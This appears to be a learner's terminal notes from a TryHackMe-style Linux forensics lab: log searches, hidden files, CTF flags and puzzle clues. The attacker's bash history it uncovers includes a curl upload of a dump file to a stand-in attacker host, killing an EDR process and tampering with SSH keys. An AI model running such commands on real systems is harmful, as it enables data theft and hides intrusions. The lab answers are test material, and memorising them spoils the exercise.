
```sh
┌──(fixit42㉿kali)-[~]
└─$ ssh mcskidy@10.82.177.103
The authenticity of host '10.82.177.103 (10.82.177.103)' can't be established.
ED25519 key fingerprint is: SHA256:Kfs8NrKcT6KWFnTxbKLVJ7+8quLd/iee5VH0rYzvKQk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.82.177.103' (ED25519) to the list of known hosts.
mcskidy@10.82.177.103's password:
```

```sh
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1014-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Dec  1 08:23:04 UTC 2025

  System load:  0.0                Temperature:           -273.1 C
  Usage of /:   21.9% of 58.09GB   Processes:             214
  Memory usage: 73%                Users logged in:       1
  Swap usage:   64%                IPv4 address for ens5: 10.10.91.133

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

66 updates can be applied immediately.
36 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

24 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Oct 23 12:58:00 2025 from 10.11.150.138
mcskidy@tbfc-web01:~$
```

```sh
mcskidy@tbfc-web01:~$ echo "Hello World!"
Hello World!
```

```sh
mcskidy@tbfc-web01:~$ ls -la
total 124
drwxr-x--- 21 mcskidy mcskidy 4096 Nov 13 17:10 .
drwxr-xr-x  6 root    root    4096 Oct 10 17:27 ..
-rw-------  1 mcskidy mcskidy  130 Dec  2 16:31 .bash_history
-rw-r--r--  1 mcskidy mcskidy  220 Oct  8 12:32 .bash_logout
-rw-r--r--  1 mcskidy mcskidy 4483 Nov 13 17:10 .bashrc
drwx------ 16 mcskidy mcskidy 4096 Oct 23 13:17 .cache
drwx------ 19 mcskidy mcskidy 4096 Oct  8 13:32 .config
drwx------  3 mcskidy mcskidy 4096 Oct  8 13:09 .dbus
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct 29 20:44 Desktop
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct 29 20:48 Documents
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Downloads
drwxrwxr-x  2 mcskidy mcskidy 4096 Oct 29 20:46 Guides
drwx------  2 mcskidy mcskidy 4096 Oct  8 13:09 .gvfs
-rw-------  1 mcskidy mcskidy  334 Oct  8 13:09 .ICEauthority
drwxrwxr-x  2 mcskidy mcskidy 4096 Oct  8 13:27 .icons
drwxrwxr-x  4 mcskidy mcskidy 4096 Oct  8 13:03 .local
drwx------  4 mcskidy mcskidy 4096 Oct 23 13:17 .mozilla
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Music
-rw-r--r--  1 mcskidy mcskidy  315 Oct  8 12:32 .pam_environment
drwxr-xr-x  2 mcskidy mcskidy 4096 Nov 13 15:18 Pictures
-rw-r--r--  1 mcskidy mcskidy  807 Oct  8 12:32 .profile
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Public
-rw-rw-r--  1 mcskidy mcskidy  264 Oct 13 01:22 README.txt
-rw-rw-r--  1 mcskidy mcskidy   66 Oct  8 12:40 .selected_editor
drwx------  3 mcskidy mcskidy 4096 Oct 23 13:16 snap
-rw-r--r--  1 mcskidy mcskidy    0 Oct  8 13:03 .sudo_as_admin_successful
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Templates
drwxrwxr-x  3 mcskidy mcskidy 4096 Oct  8 13:31 .themes
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Videos
drwxr-xr-x  2 mcskidy mcskidy 4096 Nov 13 16:44 .vnc
-rw-------  1 mcskidy mcskidy  935 Nov 13 16:33 .Xauthority

```

```sh
mcskidy@tbfc-web01:~$ cat README.txt
For all TBFC members,
Yesterday I spotted yet another Eggsploit on our servers.
Not sure what it means yet, but Wareville is in danger.
To be prepared, I'll write the security guide by tomorrow.
As a precaution, I'll also hide the guide from plain view.
~ McSkidy
```

```sh
mcskidy@tbfc-web01:~$ cd Guides

mcskidy@tbfc-web01:~/Guides$ ls -la
total 12
drwxrwxr-x  2 mcskidy mcskidy 4096 Oct 29 20:46 .
drwxr-x--- 21 mcskidy mcskidy 4096 Nov 13 17:10 ..
-rw-rw-r--  1 mcskidy mcskidy  506 Oct 29 20:46 .guide.txt

mcskidy@tbfc-web01:~/Guides$ cat .guide.txt
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!

P.S. Great job finding the guide. Your flag is:
-----------------------------------------------
THM{learning-linux-cli}
-----------------------------------------------
```

```sh
mcskidy@tbfc-web01:/var/log$ grep "Failed password" auth.log
2025-10-13T01:43:48.000724+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:43:52.044888+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:43:55.543374+00:00 tbfc-web01 sshd[1037]: Failed password for socmas from eggbox-196.hopsec.thm port 16212 ssh2
2025-10-13T01:45:08.123120+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:45:11.440030+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:46:01.816094+00:00 tbfc-web01 sshd[2392]: Failed password for socmas from eggbox-196.hopsec.thm port 20393 ssh2
2025-10-13T01:46:07.558636+00:00 tbfc-web01 sshd[2453]: Failed password for socmas from eggbox-196.hopsec.thm port 14040 ssh2
2025-10-13T01:46:15.878653+00:00 tbfc-web01 sshd[2453]: message repeated 2 times: [ Failed password for socmas from eggbox-196.hopsec.thm port 14040 ssh2]
2025-11-30T20:58:06.889989+00:00 tbfc-web01 sshd[5139]: Failed password for invalid user app from 129.212.178.137 port 51356 ssh2
2025-11-30T20:58:10.335294+00:00 tbfc-web01 sshd[5141]: Failed password for invalid user basit from 129.212.178.137 port 51364 ssh2
2025-11-30T20:58:14.320761+00:00 tbfc-web01 sshd[5144]: Failed password for invalid user stream from 129.212.178.137 port 51378 ssh2
2025-11-30T20:58:18.220665+00:00 tbfc-web01 sshd[5146]: Failed password for invalid user elasticsearch from 129.212.178.137 port 56084 ssh2
2025-11-30T20:58:21.298032+00:00 tbfc-web01 sshd[5148]: Failed password for invalid user neo4j from 129.212.178.137 port 56100 ssh2
2025-11-30T20:58:24.597374+00:00 tbfc-web01 sshd[5150]: Failed password for invalid user test from 129.212.178.137 port 56104 ssh2
2025-11-30T20:58:28.299687+00:00 tbfc-web01 sshd[5152]: Failed password for invalid user devadmin from 129.212.178.137 port 33556 ssh2
2025-11-30T20:58:31.885127+00:00 tbfc-web01 sshd[5154]: Failed password for invalid user server from 129.212.178.137 port 33566 ssh2
2025-11-30T20:58:35.519410+00:00 tbfc-web01 sshd[5156]: Failed password for invalid user steam from 129.212.178.137 port 33580 ssh2
2025-11-30T20:58:38.806596+00:00 tbfc-web01 sshd[5159]: Failed password for invalid user mysql from 129.212.178.137 port 53582 ssh2
2025-11-30T20:58:42.453046+00:00 tbfc-web01 sshd[5161]: Failed password for invalid user arpwatch from 129.212.178.137 port 53626 ssh2
2025-11-30T20:58:45.351961+00:00 tbfc-web01 sshd[5163]: Failed password for list from 129.212.178.137 port 53660 ssh2
2025-11-30T20:58:49.387833+00:00 tbfc-web01 sshd[5165]: Failed password for invalid user user from 129.212.178.137 port 55832 ssh2
2025-11-30T20:58:52.873579+00:00 tbfc-web01 sshd[5167]: Failed password for root from 129.212.178.137 port 55838 ssh2
2025-11-30T20:58:56.147348+00:00 tbfc-web01 sshd[5169]: Failed password for invalid user odoo18 from 129.212.178.137 port 55842 ssh2
2025-11-30T20:58:59.746285+00:00 tbfc-web01 sshd[5171]: Failed password for invalid user user2 from 129.212.178.137 port 34298 ssh2
2025-11-30T20:59:02.673162+00:00 tbfc-web01 sshd[5173]: Failed password for invalid user grml from 129.212.178.137 port 34310 ssh2
2025-11-30T20:59:06.328718+00:00 tbfc-web01 sshd[5175]: Failed password for invalid user dolphinscheduler from 129.212.178.137 port 38378 ssh2
2025-11-30T20:59:09.628018+00:00 tbfc-web01 sshd[5177]: Failed password for invalid user almalinux from 129.212.178.137 port 38398 ssh2
2025-11-30T20:59:13.000954+00:00 tbfc-web01 sshd[5179]: Failed password for invalid user ciuser from 129.212.178.137 port 38438 ssh2
2025-11-30T20:59:16.985090+00:00 tbfc-web01 sshd[5181]: Failed password for invalid user test2 from 129.212.178.137 port 55808 ssh2
2025-11-30T20:59:20.998088+00:00 tbfc-web01 sshd[5183]: Failed password for invalid user tom from 129.212.178.137 port 55810 ssh2
2025-11-30T20:59:23.811165+00:00 tbfc-web01 sshd[5185]: Failed password for invalid user user from 129.212.178.137 port 55826 ssh2
2025-11-30T20:59:27.432206+00:00 tbfc-web01 sshd[5187]: Failed password for invalid user gitlab from 129.212.178.137 port 48142 ssh2
2025-11-30T20:59:31.354838+00:00 tbfc-web01 sshd[5189]: Failed password for invalid user flask from 129.212.178.137 port 48154 ssh2
2025-11-30T20:59:34.472087+00:00 tbfc-web01 sshd[5191]: Failed password for root from 129.212.178.137 port 48162 ssh2
2025-11-30T20:59:37.332273+00:00 tbfc-web01 sshd[5193]: Failed password for invalid user debian from 129.212.178.137 port 51136 ssh2
2025-11-30T20:59:41.814332+00:00 tbfc-web01 sshd[5195]: Failed password for invalid user priyanka from 129.212.178.137 port 51148 ssh2
2025-11-30T20:59:45.091916+00:00 tbfc-web01 sshd[5197]: Failed password for root from 129.212.178.137 port 51150 ssh2
2025-11-30T20:59:48.447401+00:00 tbfc-web01 sshd[5199]: Failed password for root from 129.212.178.137 port 55248 ssh2
2025-11-30T20:59:51.543542+00:00 tbfc-web01 sshd[5201]: Failed password for man from 129.212.178.137 port 55258 ssh2
2025-11-30T20:59:55.551327+00:00 tbfc-web01 sshd[5203]: Failed password for invalid user esuser from 129.212.178.137 port 55274 ssh2
2025-11-30T20:59:58.097519+00:00 tbfc-web01 sshd[5205]: Failed password for invalid user redis from 129.212.178.137 port 42116 ssh2
2025-11-30T21:00:02.741244+00:00 tbfc-web01 sshd[5207]: Failed password for invalid user emregover from 129.212.178.137 port 42130 ssh2
2025-11-30T21:00:05.986970+00:00 tbfc-web01 sshd[5210]: Failed password for invalid user cloudendure from 129.212.178.137 port 42146 ssh2
2025-11-30T21:00:08.921658+00:00 tbfc-web01 sshd[5212]: Failed password for root from 129.212.178.137 port 59028 ssh2
2025-11-30T21:00:12.591130+00:00 tbfc-web01 sshd[5214]: Failed password for invalid user cbm from 129.212.178.137 port 59040 ssh2
2025-11-30T21:00:15.780362+00:00 tbfc-web01 sshd[5216]: Failed password for invalid user argebarikat from 129.212.178.137 port 59046 ssh2
2025-11-30T21:00:19.037057+00:00 tbfc-web01 sshd[5218]: Failed password for invalid user init from 129.212.178.137 port 51596 ssh2
2025-11-30T21:00:22.274139+00:00 tbfc-web01 sshd[5220]: Failed password for root from 129.212.178.137 port 51608 ssh2
2025-11-30T21:00:26.537637+00:00 tbfc-web01 sshd[5222]: Failed password for invalid user postgresql from 129.212.178.137 port 45796 ssh2
2025-11-30T21:00:29.769575+00:00 tbfc-web01 sshd[5224]: Failed password for invalid user nexus from 129.212.178.137 port 45802 ssh2
2025-11-30T21:00:32.802714+00:00 tbfc-web01 sshd[5226]: Failed password for root from 129.212.178.137 port 45808 ssh2
2025-11-30T21:00:37.011155+00:00 tbfc-web01 sshd[5228]: Failed password for root from 129.212.178.137 port 60224 ssh2
2025-11-30T21:00:40.080486+00:00 tbfc-web01 sshd[5230]: Failed password for invalid user vmail from 129.212.178.137 port 60236 ssh2
2025-11-30T21:00:43.841372+00:00 tbfc-web01 sshd[5232]: Failed password for games from 129.212.178.137 port 60250 ssh2
2025-11-30T21:00:46.349317+00:00 tbfc-web01 sshd[5234]: Failed password for invalid user downloader from 129.212.178.137 port 40404 ssh2
2025-11-30T21:00:50.641233+00:00 tbfc-web01 sshd[5236]: Failed password for invalid user yarn from 129.212.178.137 port 40416 ssh2
2025-11-30T21:00:53.533311+00:00 tbfc-web01 sshd[5238]: Failed password for invalid user srikanth from 129.212.178.137 port 40426 ssh2
2025-11-30T21:00:56.488910+00:00 tbfc-web01 sshd[5240]: Failed password for invalid user jyvtc from 129.212.178.137 port 41602 ssh2
2025-11-30T21:01:00.973715+00:00 tbfc-web01 sshd[5242]: Failed password for invalid user sysadmin from 129.212.178.137 port 41604 ssh2
2025-11-30T21:01:03.715791+00:00 tbfc-web01 sshd[5244]: Failed password for invalid user default from 129.212.178.137 port 41606 ssh2
2025-11-30T21:01:07.361691+00:00 tbfc-web01 sshd[5246]: Failed password for invalid user testuser1 from 129.212.178.137 port 50974 ssh2
2025-11-30T21:01:10.600178+00:00 tbfc-web01 sshd[5248]: Failed password for invalid user sadmin from 129.212.178.137 port 50982 ssh2
2025-11-30T21:01:14.618853+00:00 tbfc-web01 sshd[5250]: Failed password for invalid user jumpserver from 129.212.178.137 port 50990 ssh2
2025-11-30T21:01:17.767418+00:00 tbfc-web01 sshd[5252]: Failed password for invalid user user from 129.212.178.137 port 39092 ssh2
2025-11-30T21:01:20.303170+00:00 tbfc-web01 sshd[5254]: Failed password for invalid user hysteria from 129.212.178.137 port 39098 ssh2
2025-11-30T21:01:24.796094+00:00 tbfc-web01 sshd[5256]: Failed password for invalid user oracle from 129.212.178.137 port 39106 ssh2
2025-11-30T21:01:27.596932+00:00 tbfc-web01 sshd[5258]: Failed password for invalid user amrita from 129.212.178.137 port 42490 ssh2
2025-11-30T21:01:31.227339+00:00 tbfc-web01 sshd[5260]: Failed password for ubuntu from 129.212.178.137 port 42500 ssh2
2025-11-30T21:01:34.380457+00:00 tbfc-web01 sshd[5262]: Failed password for invalid user systemx from 129.212.178.137 port 42510 ssh2
2025-11-30T21:01:38.408223+00:00 tbfc-web01 sshd[5264]: Failed password for invalid user appuser from 129.212.178.137 port 51986 ssh2
2025-11-30T21:01:41.626073+00:00 tbfc-web01 sshd[5266]: Failed password for root from 129.212.178.137 port 52006 ssh2
2025-11-30T21:01:44.601581+00:00 tbfc-web01 sshd[5268]: Failed password for invalid user cseadmin from 129.212.178.137 port 52024 ssh2
2025-11-30T21:01:48.863300+00:00 tbfc-web01 sshd[5270]: Failed password for root from 129.212.178.137 port 43864 ssh2
2025-11-30T21:01:51.260264+00:00 tbfc-web01 sshd[5272]: Failed password for mail from 129.212.178.137 port 43874 ssh2
2025-11-30T21:01:55.618109+00:00 tbfc-web01 sshd[5274]: Failed password for invalid user deployer from 129.212.178.137 port 43878 ssh2
2025-11-30T21:01:58.381260+00:00 tbfc-web01 sshd[5276]: Failed password for invalid user yealink from 129.212.178.137 port 52840 ssh2
2025-11-30T21:02:02.304840+00:00 tbfc-web01 sshd[5278]: Failed password for invalid user www from 129.212.178.137 port 52852 ssh2
2025-11-30T21:02:05.545169+00:00 tbfc-web01 sshd[5280]: Failed password for root from 129.212.178.137 port 52868 ssh2
2025-11-30T21:02:09.000307+00:00 tbfc-web01 sshd[5282]: Failed password for invalid user ftp from 129.212.178.137 port 49790 ssh2
2025-11-30T21:02:12.927187+00:00 tbfc-web01 sshd[5284]: Failed password for root from 129.212.178.137 port 49794 ssh2
2025-11-30T21:02:26.877175+00:00 tbfc-web01 sshd[5286]: Failed password for invalid user admin from 129.212.178.137 port 44128 ssh2
2025-11-30T21:02:29.532673+00:00 tbfc-web01 sshd[5288]: Failed password for root from 129.212.178.137 port 44140 ssh2
2025-11-30T21:02:39.977795+00:00 tbfc-web01 sshd[5290]: Failed password for invalid user username from 129.212.178.137 port 57234 ssh2
2025-11-30T21:02:44.192664+00:00 tbfc-web01 sshd[5292]: Failed password for invalid user applmgr from 129.212.178.137 port 57242 ssh2
2025-11-30T21:02:50.968461+00:00 tbfc-web01 sshd[5294]: Failed password for invalid user sem8 from 129.212.178.137 port 40278 ssh2
2025-11-30T21:03:04.033198+00:00 tbfc-web01 sshd[5296]: Failed password for invalid user ssm-user from 129.212.178.137 port 47042 ssh2
2025-12-01T01:02:22.294202+00:00 tbfc-web01 sshd[5610]: Failed password for root from 64.227.66.216 port 42454 ssh2
2025-12-01T01:03:06.085796+00:00 tbfc-web01 sshd[5612]: Failed password for root from 64.227.66.216 port 58010 ssh2
2025-12-01T01:03:25.511251+00:00 tbfc-web01 sshd[5614]: Failed password for root from 52.173.163.34 port 3072 ssh2
2025-12-01T01:03:50.361805+00:00 tbfc-web01 sshd[5616]: Failed password for root from 64.227.66.216 port 49882 ssh2
2025-12-01T01:04:35.664812+00:00 tbfc-web01 sshd[5618]: Failed password for root from 64.227.66.216 port 43064 ssh2
2025-12-01T01:05:20.983594+00:00 tbfc-web01 sshd[5623]: Failed password for root from 64.227.66.216 port 45304 ssh2
2025-12-01T01:06:05.390889+00:00 tbfc-web01 sshd[5625]: Failed password for root from 64.227.66.216 port 48446 ssh2
2025-12-01T01:06:49.212630+00:00 tbfc-web01 sshd[5628]: Failed password for root from 64.227.66.216 port 37914 ssh2
2025-12-01T01:07:29.791080+00:00 tbfc-web01 sshd[5630]: Failed password for root from 64.227.66.216 port 41340 ssh2
2025-12-01T01:08:10.765175+00:00 tbfc-web01 sshd[5632]: Failed password for root from 64.227.66.216 port 56280 ssh2
2025-12-01T01:33:23.977684+00:00 tbfc-web01 sshd[5661]: Failed password for root from 52.173.163.34 port 3072 ssh2
2025-12-01T02:03:08.452232+00:00 tbfc-web01 sshd[5689]: Failed password for root from 52.173.163.34 port 3072 ssh2
2025-12-01T02:33:06.920343+00:00 tbfc-web01 sshd[5718]: Failed password for root from 52.173.163.34 port 3072 ssh2
2025-12-01T06:00:50.129285+00:00 tbfc-web01 sshd[5931]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T06:27:42.119116+00:00 tbfc-web01 sshd[6029]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T06:58:13.199662+00:00 tbfc-web01 sshd[6054]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T07:04:39.756083+00:00 tbfc-web01 sshd[6061]: Failed password for root from 20.109.38.177 port 22464 ssh2
2025-12-01T07:25:54.631075+00:00 tbfc-web01 sshd[6096]: Failed password for root from 20.109.38.177 port 22464 ssh2
2025-12-01T07:28:52.840467+00:00 tbfc-web01 sshd[6099]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T07:48:00.968054+00:00 tbfc-web01 sshd[6131]: Failed password for root from 20.109.38.177 port 22464 ssh2
2025-12-01T07:59:46.034833+00:00 tbfc-web01 sshd[6140]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T08:10:05.534478+00:00 tbfc-web01 sshd[6148]: Failed password for root from 20.109.38.177 port 22464 ssh2
2025-12-01T08:30:48.797415+00:00 tbfc-web01 sshd[6336]: Failed password for root from 172.212.171.144 port 50112 ssh2
2025-12-01T08:32:11.402400+00:00 tbfc-web01 sshd[6345]: Failed password for root from 20.109.38.177 port 22464 ssh2

```

![[Images/Pasted image 20251202182815.png]]


```sh
mcskidy@tbfc-web01:/var/log$ find /home/socmas -name *egg*
/home/socmas/2025/eggstrike.sh
mcskidy@tbfc-web01:/var/log$ cat /home/socmas/2025/eggstrike.sh
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
```

```sh
mcskidy@tbfc-web01:/var/log$ cat /etc/shadow
cat: /etc/shadow: Permission denied                                                                                           
mcskidy@tbfc-web01:/var/log$ whoami
mcskidy
mcskidy@tbfc-web01:/var/log$ sudo su
root@tbfc-web01:/var/log$ whoami
root
root@tbfc-web01:/var/log$ cd /root
root@tbfc-web01:~$ ls -la
total 80
drwx------ 11 root root  4096 Nov 13 16:52 .
drwxr-xr-x 22 root root  4096 Dec  2 16:23 ..
-rw-------  1 root root   295 Dec  2 17:02 .bash_history
-rw-r--r--  1 root root  3812 Nov 11 16:26 .bashrc
-rw-r--r--  1 root root  3812 Oct 13 01:06 .bashrc.bak
drwxr-xr-x  5 root root  4096 Oct  8 12:30 .cache
drwx------  3 root root  4096 Oct  3  2024 .config
drwx------  3 root root  4096 Oct  8 12:30 .dbus
drwx------  3 root root  4096 Oct  3  2024 .launchpadlib
drwxr-xr-x  3 root root  4096 Feb 27  2022 .local
-rw-r--r--  1 root root   161 Nov 11 16:26 .profile
-rw-r--r--  1 root root   161 Dec  5  2019 .profile.bak
-rw-r--r--  1 root root    66 Feb 27  2022 .selected_editor
drwx------  2 root root  4096 Oct 13 01:37 .ssh
-rw-------  1 root root 10711 Nov 11 14:21 .viminfo
drwxr-xr-x  2 root root  4096 Feb 27  2022 .vnc
drwxr-xr-x  2 root root  4096 Nov 11 16:26 fix_passfrag_backups_20251111162618
drwxr-xr-x  5 root root  4096 Sep  1  2024 snap
root@tbfc-web01:~$ cat .bash_history
whoami
cd ~
ll 
nano .ssh/authorized_keys 
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
pkill tbfcedr
cat /etc/shadow
cat /etc/hosts
exit
whoami
cd /root
ls -la
root@tbfc-web01:~$ exit
exit
mcskidy@tbfc-web01:/var/log$ cd ~
mcskidy@tbfc-web01:~$ ls -la
total 124
drwxr-x--- 21 mcskidy mcskidy 4096 Nov 13 17:10 .
drwxr-xr-x  6 root    root    4096 Oct 10 17:27 ..
-rw-------  1 mcskidy mcskidy  356 Dec  2 17:05 .bash_history
-rw-r--r--  1 mcskidy mcskidy  220 Oct  8 12:32 .bash_logout
-rw-r--r--  1 mcskidy mcskidy 4483 Nov 13 17:10 .bashrc
drwx------ 16 mcskidy mcskidy 4096 Oct 23 13:17 .cache
drwx------ 19 mcskidy mcskidy 4096 Oct  8 13:32 .config
drwx------  3 mcskidy mcskidy 4096 Oct  8 13:09 .dbus
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct 29 20:44 Desktop
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct 29 20:48 Documents
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Downloads
drwxrwxr-x  2 mcskidy mcskidy 4096 Oct 29 20:46 Guides
drwx------  2 mcskidy mcskidy 4096 Oct  8 13:09 .gvfs
-rw-------  1 mcskidy mcskidy  334 Oct  8 13:09 .ICEauthority
drwxrwxr-x  2 mcskidy mcskidy 4096 Oct  8 13:27 .icons
drwxrwxr-x  4 mcskidy mcskidy 4096 Oct  8 13:03 .local
drwx------  4 mcskidy mcskidy 4096 Oct 23 13:17 .mozilla
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Music
-rw-r--r--  1 mcskidy mcskidy  315 Oct  8 12:32 .pam_environment
drwxr-xr-x  2 mcskidy mcskidy 4096 Nov 13 15:18 Pictures
-rw-r--r--  1 mcskidy mcskidy  807 Oct  8 12:32 .profile
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Public
-rw-rw-r--  1 mcskidy mcskidy  264 Oct 13 01:22 README.txt
-rw-rw-r--  1 mcskidy mcskidy   66 Oct  8 12:40 .selected_editor
drwx------  3 mcskidy mcskidy 4096 Oct 23 13:16 snap
-rw-r--r--  1 mcskidy mcskidy    0 Oct  8 13:03 .sudo_as_admin_successful
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Templates
drwxrwxr-x  3 mcskidy mcskidy 4096 Oct  8 13:31 .themes
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct  8 13:09 Videos
drwxr-xr-x  2 mcskidy mcskidy 4096 Nov 13 16:44 .vnc
-rw-------  1 mcskidy mcskidy  935 Nov 13 16:33 .Xauthority
mcskidy@tbfc-web01:~$ cat .bash_history
nano README.txt
cd Guides/
nano .guide.txt
cat .guide.txt 
su eddi_knapp
cat /var/log/auth.log 
su eddi_knapp
echo "Hello World!"
ls -la
cat README.txt
cd Guides
ls -la
cat .guide.txt
cd /var/logs
ls -la
cd /var/log
ls -la
grep "Failed password" auth.log
find /home/socmas -name *egg*
cat /home/socmas/2025/eggstrike.sh
cat /etc/shadow
whoami
sudo su
cd ~
ls -la
mcskidy@tbfc-web01:~$ cd ..
mcskidy@tbfc-web01:/home$ ls -la
total 24
drwxr-xr-x   6 root       root       4096 Oct 10 17:27 .
drwxr-xr-x  22 root       root       4096 Dec  2 16:23 ..
drwxr-x---  18 eddi_knapp eddi_knapp 4096 Dec  1 08:52 eddi_knapp
drwxr-x---  21 mcskidy    mcskidy    4096 Nov 13 17:10 mcskidy
drwxr-x---+  6 socmas     socmas     4096 Nov 12 21:27 socmas
drwxr-xr-x  22 ubuntu     ubuntu     4096 Dec  2 16:23 ubuntu
mcskidy@tbfc-web01:/home$ cd eddi_knapp
-bash: cd: eddi_knapp: Permission denied
mcskidy@tbfc-web01:/home$ su eddi_lnapp
su: user eddi_lnapp does not exist or the user entry does not contain all the required fields
mcskidy@tbfc-web01:/home$ su eddi_knapp
Password: 
su: Authentication failure
mcskidy@tbfc-web01:/home$ su eddi_knapp
Password: 
su: Authentication failure
mcskidy@tbfc-web01:/home$ cd 
mcskidy@tbfc-web01:~$ cd ~
mcskidy@tbfc-web01:~$ cd Documents
mcskidy@tbfc-web01:~/Documents$ ls -la
total 12
drwxr-xr-x  2 mcskidy mcskidy 4096 Oct 29 20:48 .
drwxr-x--- 21 mcskidy mcskidy 4096 Nov 13 17:10 ..
-rw-rw-r--  1 mcskidy mcskidy 1078 Oct 29 20:48 read-me-please.txt
mcskidy@tbfc-web01:~/Documents$ cat read-me-please.txt
From: mcskidy
To: whoever finds this

I had a short second when no one was watching. I used it.

I've managed to plant a few clues around the account.
If you can get into the user below and look carefully,
those three little "easter eggs" will combine into a passcode
that unlocks a further message that I encrypted in the
/home/eddi_knapp/Documents/ directory.
I didn't want the wrong eyes to see it.

Access the user account:
username: eddi_knapp
password: S0mething1Sc0ming

There are three hidden easter eggs.
They combine to form the passcode to open my encrypted vault.

Clues (one for each egg):

1)
I ride with your session, not with your chest of files.
Open the little bag your shell carries when you arrive.

2)
The tree shows today; the rings remember yesterday.
Read the ledger’s older pages.

3)
When pixels sleep, their tails sometimes whisper plain words.
Listen to the tail.

Find the fragments, join them in order, and use the resulting passcode
to decrypt the message I left. Be careful — I had to be quick,
and I left only enough to get help.

~ McSkidy
mcskidy@tbfc-web01:~/Documents$
```

```sh

```

```sh

```

```sh

```

